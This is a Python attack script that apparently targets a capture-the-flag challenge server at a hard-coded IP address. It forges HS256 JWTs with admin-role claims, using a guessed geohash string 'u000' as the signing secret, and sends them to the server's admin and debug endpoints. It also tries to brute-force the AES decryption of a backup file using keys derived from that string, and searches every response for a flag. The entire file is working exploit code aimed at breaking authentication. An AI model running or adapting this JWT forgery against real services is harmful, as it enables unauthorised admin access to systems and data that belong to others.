#!/usr/bin/env python3
"""
Check what u000 geohash actually represents
"""

import pygeohash as pgh
import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

TARGET_URL = "http://138.199.163.92:12973/"

# Decode u000 to see what coordinates it represents
print("="*60)
print("Analyzing u000 Geohash")
print("="*60)

lat, lon = pgh.decode("u000")
print(f"u000 decodes to: lat={lat}, lon={lon}")

lat, lon = pgh.decode("s000")
print(f"s000 decodes to: lat={lat}, lon={lon}")

# Try encoding those coordinates
print(f"\nEncoding ({lat}, {lon}):")
for precision in range(1, 10):
    gh = pgh.encode(lat, lon, precision=precision)
    print(f"  Precision {precision}: {gh}")

# Now try u000 as JWT secret and AES key
print("\n" + "="*60)
print("Testing u000 as JWT Secret")
print("="*60)

session = requests.Session()

# Try various payloads
payloads = [
    {"role": "admin"},
    {"user": "admin", "role": "admin"},
    {"admin": True},
    {"geohash": "u000", "role": "admin"},
]

for payload in payloads:
    token = jwt.encode(payload, "u000", algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}
    
    resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=5)
    
    if resp.status_code == 200:
        print(f"\n[!!!] SUCCESS with payload: {payload}")
        print(resp.text)
        
        if 'kaal{' in resp.text.lower():
            import re
            flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag:
                print(f"\n[!!!] FLAG: {flag.group(0)}")
    elif resp.status_code != 401:
        print(f"Payload {payload}: {resp.status_code}")

# Try u000 as AES key
print("\n" + "="*60)
print("Testing u000 as AES Key")
print("="*60)

try:
    with open('backup.bin', 'rb') as f:
        data = f.read()
    
    key_strings = ["u000", "u0000", "u00000", "u000000", "u0000000", "u00000000"]
    
    for key_str in key_strings:
        # Try SHA256
        key = hashlib.sha256(key_str.encode()).digest()
        iv = b'\x00' * 16
        
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data)
            unpadded = unpad(decrypted, 16)
            text = unpadded.decode('utf-8', errors='ignore')
            
            if 'kaal{' in text.lower() or all(32 <= b < 127 for b in unpadded):
                print(f"\n[!!!] Decrypted with key: {key_str}")
                print(f"Text: {text}")
                
                if 'kaal{' in text.lower():
                    import re
                    flag = re.search(r'Kaal\{[^}]+\}', text, re.IGNORECASE)
                    if flag:
                        print(f"\n[!!!] FLAG: {flag.group(0)}")
        except Exception as e:
            pass
        
        # Also try with MD5 as IV
        try:
            iv = hashlib.md5(key_str.encode()).digest()
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data)
            unpadded = unpad(decrypted, 16)
            text = unpadded.decode('utf-8', errors='ignore')
            
            if 'kaal{' in text.lower() or all(32 <= b < 127 for b in unpadded):
                print(f"\n[!!!] Decrypted with key: {key_str} (MD5 IV)")
                print(f"Text: {text}")
                
                if 'kaal{' in text.lower():
                    import re
                    flag = re.search(r'Kaal\{[^}]+\}', text, re.IGNORECASE)
                    if flag:
                        print(f"\n[!!!] FLAG: {flag.group(0)}")
        except:
            pass

except FileNotFoundError:
    print("backup.bin not found")

# Try the geohash-debug endpoint with u000
print("\n" + "="*60)
print("Testing geohash-debug endpoint")
print("="*60)

# First try to get a token with u000
token = jwt.encode({"role": "admin"}, "u000", algorithm="HS256")
headers = {"Authorization": f"Bearer {token}"}

resp = session.post(
    TARGET_URL + 'api/v3/geohash-debug-2025',
    json={"geohash": "u000", "lat": lat, "lon": lon},
    headers=headers,
    timeout=5
)

print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

if 'kaal{' in resp.text.lower():
    import re
    flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
    if flag:
        print(f"\n[!!!] FLAG: {flag.group(0)}")
